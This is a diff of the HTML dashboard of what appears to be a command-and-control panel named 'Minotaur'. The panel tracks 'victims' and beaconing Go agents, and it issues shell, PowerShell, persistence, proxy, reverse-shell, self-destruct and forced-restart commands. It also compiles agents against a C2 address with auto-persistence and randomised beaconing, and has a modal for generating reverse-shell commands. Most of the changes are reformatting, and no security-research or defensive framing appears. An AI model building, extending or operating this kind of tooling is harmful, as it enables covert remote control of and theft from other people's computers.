@@ -78,6 +78,15 @@
             transition: all 0.2s ease;
             border-bottom: 2px solid transparent;
         }
+
+        .copy-btn {
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .copy-btn:hover {
+            background-color: #4a5568 !important;
+        }
     </style>
 </head>
 
@@ -100,7 +109,7 @@
             <button id="tab-build" class="tab-btn px-4 py-2 font-semibold">🛠️ Build & Update</button>
         </div>
 
-        <!-- ==================== TCP SHELLS ==================== -->
+        <!-- ==================== TCP SHELLS SECTION ==================== -->
         <div id="tcp-section" class="space-y-6">
             <!-- Victims Table -->
             <div class="bg-gray-800 rounded-xl shadow-lg overflow-hidden">
@@ -119,13 +128,13 @@
                         <thead class="bg-gray-800">
                             <tr>
                                 <th class="px-4 py-3 text-left text-xs font-medium uppercase">ID</th>
-                                <th>Host/IP</th>
-                                <th>OS</th>
-                                <th>Last Seen</th>
-                                <th>Action</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Host/IP</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">OS</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Last Seen</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Action</th>
                             </tr>
                         </thead>
-                        <tbody id="victim-table-body"></tbody>
+                        <tbody id="victim-table-body" class="divide-y divide-gray-700"></tbody>
                     </table>
                 </div>
             </div>
@@ -144,15 +153,18 @@
                             <option value="single">🎯 Single victim</option>
                             <option value="os">🌍 All victims (by OS)</option>
                         </select>
-                        <div id="single-target-div"><select id="victim-select"
-                                class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[150px]"></select></div>
-                        <div id="os-target-div" style="display:none;"><select id="os-select"
-                                class="bg-gray-700 rounded-lg px-3 py-2 text-sm">
+                        <div id="single-target-div">
+                            <select id="victim-select"
+                                class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[150px]"></select>
+                        </div>
+                        <div id="os-target-div" style="display:none;">
+                            <select id="os-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm">
                                 <option value="windows">Windows</option>
                                 <option value="linux">Linux</option>
                                 <option value="darwin">macOS</option>
                                 <option value="unknown">Unknown</option>
-                            </select></div>
+                            </select>
+                        </div>
                         <button id="exec-btn"
                             class="bg-blue-600 hover:bg-blue-700 px-5 py-2 rounded-lg flex items-center gap-2"><i
                                 class="fas fa-paper-plane"></i> Send</button>
@@ -165,20 +177,29 @@
                 <div class="lg:col-span-2 bg-gray-800 rounded-xl shadow-lg p-5">
                     <h2 class="text-xl font-semibold mb-3"><i class="fas fa-plug text-green-400 mr-2"></i>Dynamic Ports
                         (TCP Listeners)</h2>
-                    <div class="mb-3"><label class="inline-flex items-center mr-4"><input type="radio" name="port-mode"
-                                value="single" checked class="form-radio text-blue-500"><span class="ml-2">Single
-                                Port</span></label><label class="inline-flex items-center"><input type="radio"
-                                name="port-mode" value="range" class="form-radio text-blue-500"><span class="ml-2">Port
-                                Range (e.g., 8000-8010)</span></label></div>
-                    <div id="single-port-input" class="flex gap-2 mb-4"><input type="number" id="new-port"
-                            placeholder="Port number" class="bg-gray-700 text-white rounded px-3 py-2 flex-1"><button
-                            id="open-port-btn" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg"><i
-                                class="fas fa-play"></i> Open</button></div>
-                    <div id="range-port-input" style="display:none;" class="flex gap-2 mb-4"><input type="text"
-                            id="port-range" placeholder="e.g., 8000-8010"
-                            class="bg-gray-700 text-white rounded px-3 py-2 flex-1"><button id="open-range-btn"
-                            class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg"><i
-                                class="fas fa-layer-group"></i> Open Range</button></div>
+                    <div class="mb-3">
+                        <label class="inline-flex items-center mr-4">
+                            <input type="radio" name="port-mode" value="single" checked
+                                class="form-radio text-blue-500">
+                            <span class="ml-2">Single Port</span>
+                        </label>
+                        <label class="inline-flex items-center">
+                            <input type="radio" name="port-mode" value="range" class="form-radio text-blue-500">
+                            <span class="ml-2">Port Range (e.g., 8000-8010)</span>
+                        </label>
+                    </div>
+                    <div id="single-port-input" class="flex gap-2 mb-4">
+                        <input type="number" id="new-port" placeholder="Port number"
+                            class="bg-gray-700 text-white rounded px-3 py-2 flex-1">
+                        <button id="open-port-btn" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg"><i
+                                class="fas fa-play"></i> Open</button>
+                    </div>
+                    <div id="range-port-input" style="display:none;" class="flex gap-2 mb-4">
+                        <input type="text" id="port-range" placeholder="e.g., 8000-8010"
+                            class="bg-gray-700 text-white rounded px-3 py-2 flex-1">
+                        <button id="open-range-btn" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg"><i
+                                class="fas fa-layer-group"></i> Open Range</button>
+                    </div>
                     <h3 class="text-sm font-semibold text-gray-300 mb-2"><i class="fas fa-history mr-1"></i>Port
                         Connection Log</h3>
                     <div id="port-log" class="bg-black rounded-lg p-2 h-48 overflow-y-auto text-xs font-mono"></div>
@@ -191,13 +212,14 @@
             </div>
         </div>
 
-        <!-- ==================== HTTP AGENTS ==================== -->
+        <!-- ==================== HTTP AGENTS SECTION ==================== -->
         <div id="agents-section" class="hidden space-y-6">
             <div class="bg-gray-800 rounded-xl shadow-lg overflow-hidden">
                 <div class="bg-gray-700 px-4 py-3 border-b border-gray-600 flex justify-between items-center">
                     <div>
                         <h2 class="text-xl font-semibold"><i class="fas fa-robot mr-2"></i>HTTP Agents (Go)</h2>
-                        <p class="text-xs text-gray-300">Beaconing agents with exec, exfil, lateral, persistence</p>
+                        <p class="text-xs text-gray-300">Beaconing agents with exec, help, checkin, config, proc, net,
+                            shell, powershell, persistence, proxy, shell-reverse, update, delete</p>
                     </div>
                     <div class="flex gap-2"><button id="refresh-agents-btn"
                             class="bg-blue-600 hover:bg-blue-700 text-sm px-3 py-1 rounded flex items-center gap-2"><i
@@ -210,58 +232,52 @@
                         <thead class="bg-gray-800">
                             <tr>
                                 <th class="px-4 py-3 text-left text-xs font-medium uppercase">ID</th>
-                                <th>Hostname</th>
-                                <th>OS/Arch</th>
-                                <th>IP</th>
-                                <th>Version</th>
-                                <th>Last Beacon</th>
-                                <th>Status</th>
-                                <th>Actions</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Hostname</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">OS/Arch</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">IP</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Version</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Last Beacon</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Status</th>
+                                <th class="px-4 py-3 text-left text-xs font-medium uppercase">Actions</th>
                             </tr>
                         </thead>
-                        <tbody id="agents-table-body"></tbody>
+                        <tbody id="agents-table-body" class="divide-y divide-gray-700"></tbody>
                     </table>
                 </div>
             </div>
-
             <div class="bg-gray-800 rounded-xl shadow-lg p-5">
                 <h2 class="text-xl font-semibold mb-3"><i class="fas fa-terminal text-yellow-400 mr-2"></i>Execute
                     Command on Agent</h2>
                 <select id="agent-cmd-type" class="bg-gray-700 rounded px-3 py-2 text-sm w-full mb-3">
                     <option value="exec">Raw System Command (exec)</option>
                     <option value="help">help – Show help</option>
-                    <option value="sleep">sleep – Set beacon delay</option>
                     <option value="checkin">checkin – Force check-in</option>
-                    <option value="pwd">pwd – Print working directory</option>
-                    <option value="cd">cd – Change directory</option>
-                    <option value="dir">dir/ls – List directory</option>
-                    <option value="cat">cat – Display file content</option>
-                    <option value="mkdir">mkdir – Create directory</option>
-                    <option value="remove">remove/rm – Remove file/directory</option>
-                    <option value="cp">cp – Copy file</option>
-                    <option value="upload">upload – Upload file (base64)</option>
-                    <option value="download">download – Download file (base64)</option>
-                    <option value="shell">shell – Execute cmd/sh command</option>
-                    <option value="powershell">powershell – Execute PowerShell (Windows)</option>
+                    <option value="config">config – Configure agent behaviour</option>
                     <option value="proc">proc – List processes</option>
                     <option value="net">net – Network enumeration</option>
-                    <option value="exfil">exfil – Exfiltrate a file</option>
-                    <option value="lateral">lateral – Lateral movement (SSH)</option>
+                    <option value="shell">shell – Execute cmd/sh command</option>
+                    <option value="powershell">powershell – Execute PowerShell (Windows)</option>
                     <option value="persistence">persistence – Install persistence</option>
                     <option value="proxy">proxy – Start HTTP proxy</option>
+                    <option value="socks">socks – Start SOCKS5 proxy</option>
+                    <option value="proxy_stop">proxy_stop – Stop HTTP/SOCKS5 proxy (port or "all")</option>
                     <option value="shell-reverse">shell-reverse – Spawn reverse shell</option>
-                    <option value="dll">dll – Inject DLL (Windows)</option>
+                    <option value="update">update – Update agent to current version</option>
                     <option value="delete">delete – Self-destruct</option>
+                    <option value="health">health – Check agent health (uptime, memory, restarts)</option>
+                    <option value="schedule">schedule – Manage scheduled tasks (cron/schtasks)</option>
+                    <option value="restart">restart – Force system restart (optional delay, message)</option>
                 </select>
                 <div id="agent-cmd-args" class="mb-3"></div>
-                <div class="flex flex-wrap gap-3 mt-3"><select id="agent-select"
-                        class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[200px]">
+                <div class="flex flex-wrap gap-3 mt-3">
+                    <select id="agent-select" class="bg-gray-700 rounded-lg px-3 py-2 text-sm min-w-[200px]">
                         <option value="">-- Select an agent --</option>
-                    </select><button id="agent-exec-btn"
+                    </select>
+                    <button id="agent-exec-btn"
                         class="bg-blue-600 hover:bg-blue-700 px-5 py-2 rounded-lg flex items-center gap-2"><i
-                            class="fas fa-paper-plane"></i> Send to Agent</button></div>
+                            class="fas fa-paper-plane"></i> Send to Agent</button>
+                </div>
             </div>
-
             <div class="bg-gray-800 rounded-xl shadow-lg p-5">
                 <h2 class="text-xl font-semibold mb-3"><i class="fas fa-history text-yellow-400 mr-2"></i>Agent Activity
                     Log</h2>
@@ -269,31 +285,36 @@
             </div>
         </div>
 
-        <!-- ==================== ACTIVITY LOGS ==================== -->
+        <!-- ==================== ACTIVITY LOGS SECTION ==================== -->
         <div id="logs-section" class="hidden space-y-6">
             <div class="bg-gray-800 rounded-xl shadow-lg p-5">
-                <div class="flex gap-4 border-b border-gray-700 mb-4"><button id="tab-shell-logs"
+                <div class="flex gap-4 border-b border-gray-700 mb-4">
+                    <button id="tab-shell-logs"
                         class="tab-log-btn px-3 py-1 text-sm font-semibold text-blue-400 border-b-2 border-blue-400">Shell
-                        Logs</button><button id="tab-agent-logs"
-                        class="tab-log-btn px-3 py-1 text-sm font-semibold text-gray-400">Agent Logs</button></div>
+                        Logs</button>
+                    <button id="tab-agent-logs" class="tab-log-btn px-3 py-1 text-sm font-semibold text-gray-400">Agent
+                        Logs</button>
+                </div>
                 <div id="shell-logs-panel">
-                    <div class="mb-3 flex gap-2"><select id="shell-log-filter"
-                            class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                    <div class="mb-3 flex gap-2">
+                        <select id="shell-log-filter" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
                             <option value="">-- All victims --</option>
-                        </select><button id="refresh-shell-logs"
-                            class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button><button
-                            id="download-shell-logs" class="bg-green-600 px-3 py-1 rounded text-sm">📥 Download</button>
+                        </select>
+                        <button id="refresh-shell-logs" class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button>
+                        <button id="download-shell-logs" class="bg-green-600 px-3 py-1 rounded text-sm">📥
+                            Download</button>
                     </div>
                     <div id="shell-logs-container"
                         class="bg-black rounded-lg p-2 h-96 overflow-y-auto text-xs font-mono"></div>
                 </div>
                 <div id="agent-logs-panel" class="hidden">
-                    <div class="mb-3 flex gap-2"><select id="agent-log-filter"
-                            class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
+                    <div class="mb-3 flex gap-2">
+                        <select id="agent-log-filter" class="bg-gray-700 rounded px-3 py-1 text-sm flex-1">
                             <option value="">-- All agents --</option>
-                        </select><button id="refresh-agent-logs"
-                            class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button><button
-                            id="download-agent-logs" class="bg-green-600 px-3 py-1 rounded text-sm">📥 Download</button>
+                        </select>
+                        <button id="refresh-agent-logs" class="bg-blue-600 px-3 py-1 rounded text-sm">Refresh</button>
+                        <button id="download-agent-logs" class="bg-green-600 px-3 py-1 rounded text-sm">📥
+                            Download</button>
                     </div>
                     <div id="agent-logs-container"
                         class="bg-black rounded-lg p-2 h-96 overflow-y-auto text-xs font-mono"></div>
@@ -301,59 +322,99 @@
             </div>
         </div>
 
-        <!-- ==================== BUILD & UPDATE ==================== -->
+        <!-- ==================== BUILD & UPDATE SECTION ==================== -->
         <div id="build-section" class="hidden space-y-6">
-            <!-- Build Form -->
+            <!-- Build Form Card -->
             <div class="bg-gray-800 rounded-xl shadow-lg p-5">
                 <h2 class="text-xl font-semibold mb-3"><i class="fas fa-code-branch text-green-400 mr-2"></i>Compile
                     Minotaur Agent</h2>
                 <p class="text-sm text-gray-300 mb-4">Customise the agent's communication parameters and compile for any
                     platform.</p>
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div><label class="block text-sm font-medium mb-1">C2 Server URL</label><input type="text"
-                            id="build-c2-url" class="w-full bg-gray-700 rounded px-3 py-2"
-                            value="http://192.168.2.133:5000"></div>
-                    <div><label class="block text-sm font-medium mb-1">Beacon Delay (seconds)</label><input
-                            type="number" id="build-beacon-delay" class="w-full bg-gray-700 rounded px-3 py-2"
-                            value="60" min="5"></div>
-                    <div><label class="block text-sm font-medium mb-1">Jitter (seconds)</label><input type="number"
-                            id="build-jitter" class="w-full bg-gray-700 rounded px-3 py-2" value="5" min="0"></div>
-                    <div><label class="block text-sm font-medium mb-1">User-Agent</label><input type="text"
-                            id="build-user-agent" class="w-full bg-gray-700 rounded px-3 py-2"
-                            value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"></div>
-                    <div class="flex items-center"><input type="checkbox" id="build-insecure-tls" class="mr-2"
-                            checked><label class="text-sm font-medium">Skip TLS verification (InsecureTLS)</label></div>
-                    <div class="flex items-center"><input type="checkbox" id="build-auto-persistence"
-                            class="mr-2"><label class="text-sm font-medium">Auto‑install Persistence (on first
-                            run)</label></div>
-                    <div class="flex items-center"><input type="checkbox" id="build-debug-mode" class="mr-2"><label
-                            class="text-sm font-medium">Debug Mode (show console, verbose logs)</label></div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1">C2 Server URL</label>
+                        <input type="text" id="build-c2-url" class="w-full bg-gray-700 rounded px-3 py-2"
+                            value="http://192.168.2.133:5000">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1">User-Agent</label>
+                        <input type="text" id="build-user-agent" class="w-full bg-gray-700 rounded px-3 py-2"
+                            value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36">
+                    </div>
+                    <div class="flex items-center">
+                        <input type="checkbox" id="build-insecure-tls" class="mr-2" checked>
+                        <label class="text-sm font-medium">Skip TLS verification (InsecureTLS)</label>
+                    </div>
+                    <div class="flex items-center">
+                        <input type="checkbox" id="build-auto-persistence" class="mr-2">
+                        <label class="text-sm font-medium">Auto‑install Persistence (on first run)</label>
+                    </div>
+                    <div class="flex items-center">
+                        <input type="checkbox" id="build-debug-mode" class="mr-2">
+                        <label class="text-sm font-medium">Debug Mode (show console, verbose logs, fixed beacon
+                            timing)</label>
+                    </div>
+                    <div class="flex items-center">
+                        <input type="checkbox" id="build-enable-auth" class="mr-2">
+                        <label class="text-sm font-medium">Enable server authentication (RSA) – prevents domain
+                            takeover</label>
+                    </div>
                 </div>
+
+                <!-- Hidden until Debug Mode is checked -->
+                <div id="debug-options" style="display: none;" class="mt-4 border-t border-gray-700 pt-4">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm font-medium mb-1">Beacon Delay (seconds)</label>
+                            <input type="number" id="build-beacon-delay" class="w-full bg-gray-700 rounded px-3 py-2"
+                                value="60" min="5">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium mb-1">Jitter (seconds)</label>
+                            <input type="number" id="build-jitter" class="w-full bg-gray-700 rounded px-3 py-2"
+                                value="5" min="0">
+                        </div>
+                    </div>
+                    <p class="text-xs text-gray-400 mt-2">When Debug Mode is off, these values are ignored and the agent
+                        uses randomised beacon timing (30–300s, jitter up to 60s).</p>
+                </div>
+
                 <div class="mt-4 border-t border-gray-700 pt-4">
                     <h3 class="text-md font-semibold mb-2">Target Platform</h3>
-                    <div class="flex flex-wrap gap-4"><select id="build-goos" class="bg-gray-700 rounded px-3 py-2">
+                    <div class="flex flex-wrap gap-4">
+                        <select id="build-goos" class="bg-gray-700 rounded px-3 py-2">
                             <option value="windows">Windows</option>
                             <option value="linux">Linux</option>
                             <option value="darwin">macOS</option>
-                        </select><select id="build-goarch" class="bg-gray-700 rounded px-3 py-2">
+                        </select>
+                        <select id="build-goarch" class="bg-gray-700 rounded px-3 py-2">
                             <option value="amd64">amd64 (64-bit)</option>
                             <option value="386">386 (32-bit)</option>
                             <option value="arm64">arm64 (ARM64)</option>
-                        </select><button id="build-agent-btn"
-                            class="bg-green-600 hover:bg-green-700 px-5 py-2 rounded-lg flex items-center gap-2"><i
-                                class="fas fa-cogs"></i> Compile & Host</button></div>
+                        </select>
+                        <button id="build-agent-btn"
+                            class="bg-green-600 hover:bg-green-700 px-5 py-2 rounded-lg flex items-center gap-2">
+                            <i class="fas fa-cogs"></i> Compile & Host
+                        </button>
+                    </div>
                 </div>
                 <div id="build-status" class="mt-4 p-2 bg-black rounded text-sm font-mono hidden"></div>
             </div>
 
-            <!-- Download & Deploy -->
+            <!-- Download & Deploy Agent Card -->
             <div class="bg-gray-800 rounded-xl shadow-lg p-5">
-                <h2 class="text-xl font-semibold mb-3"><i class="fas fa-download text-blue-400 mr-2"></i>Download &
-                    Deploy Agent</h2>
+                <div class="flex justify-between items-center mb-3">
+                    <h2 class="text-xl font-semibold"><i class="fas fa-download text-blue-400 mr-2"></i>Download &
+                        Deploy Agent</h2>
+                    <div class="text-sm text-gray-400 bg-gray-700 px-2 py-1 rounded">
+                        <i class="fas fa-link mr-1"></i> C2 URL: <span id="c2-url-display"
+                            class="font-mono text-blue-300"></span>
+                    </div>
+                </div>
                 <div id="available-agents-list" class="space-y-4"></div>
             </div>
 
-            <!-- Version Management -->
+            <!-- Version Management Card -->
             <div class="bg-gray-800 rounded-xl shadow-lg p-5">
                 <h2 class="text-xl font-semibold mb-3"><i class="fas fa-tag text-blue-400 mr-2"></i>Agent Versions</h2>
                 <div class="overflow-x-auto">
@@ -369,7 +430,6 @@
                         </thead>
                         <tbody id="agent-versions-table-body"></tbody>
                     </table>
-                    
                 </div>
             </div>
         </div>
@@ -379,25 +439,46 @@
     <div id="shell-modal" class="modal">
         <div class="modal-content">
             <div class="flex justify-between items-center mb-4">
-                <h2 class="text-xl font-bold">Generate Reverse Shell Command</h2><span id="close-modal"
-                    class="cursor-pointer text-gray-400 hover:text-white text-2xl">&times;</span>
-            </div><label class="block mb-2">IP / Domain</label><input type="text" id="shell-ip"
-                class="w-full bg-gray-700 rounded p-2 mb-3" value="127.0.0.1"><label
-                class="block mb-2">Port</label><input type="number" id="shell-port"
-                class="w-full bg-gray-700 rounded p-2 mb-3" value="4444"><label class="block mb-2">Type</label><select
-                id="shell-type" class="w-full bg-gray-700 rounded p-2 mb-3">
+                <h2 class="text-xl font-bold">Generate Reverse Shell Command</h2>
+                <span id="close-modal" class="cursor-pointer text-gray-400 hover:text-white text-2xl">&times;</span>
+            </div>
+            <label class="block mb-2">IP / Domain</label>
+            <input type="text" id="shell-ip" class="w-full bg-gray-700 rounded p-2 mb-3" value="127.0.0.1">
+            <label class="block mb-2">Port</label>
+            <input type="number" id="shell-port" class="w-full bg-gray-700 rounded p-2 mb-3" value="4444">
+            <label class="block mb-2">Type</label>
+            <select id="shell-type" class="w-full bg-gray-700 rounded p-2 mb-3">
                 <option value="bash">Bash (Linux/macOS)</option>
                 <option value="nc">Netcat (traditional)</option>
                 <option value="ncat">Ncat (with SSL)</option>
                 <option value="powershell">PowerShell (Windows)</option>
                 <option value="python">Python</option>
-            </select><button id="copy-shell-cmd" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded w-full">Copy
-                Command</button><textarea id="shell-output-cmd" readonly rows="4"
+            </select>
+            <button id="copy-shell-cmd" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded w-full">Copy
+                Command</button>
+            <textarea id="shell-output-cmd" readonly rows="4"
                 class="w-full bg-gray-900 rounded p-2 mt-3 text-sm font-mono"></textarea>
         </div>
     </div>
 
     <script src="/static/js/dashboard.js"></script>
+    <script>
+        // Update the displayed C2 URL in the Download & Deploy card when the build input changes
+        function updateC2UrlDisplay() {
+            $('#c2-url-display').text($('#build-c2-url').val());
+        }
+        $('#build-c2-url').on('input', updateC2UrlDisplay);
+        updateC2UrlDisplay();
+
+        // Toggle visibility of beacon delay/jitter fields when Debug Mode checkbox changes
+        $('#build-debug-mode').change(function () {
+            if ($(this).is(':checked')) {
+                $('#debug-options').show();
+            } else {
+                $('#debug-options').hide();
+            }
+        }).trigger('change');
+    </script>
 </body>
 
 </html>
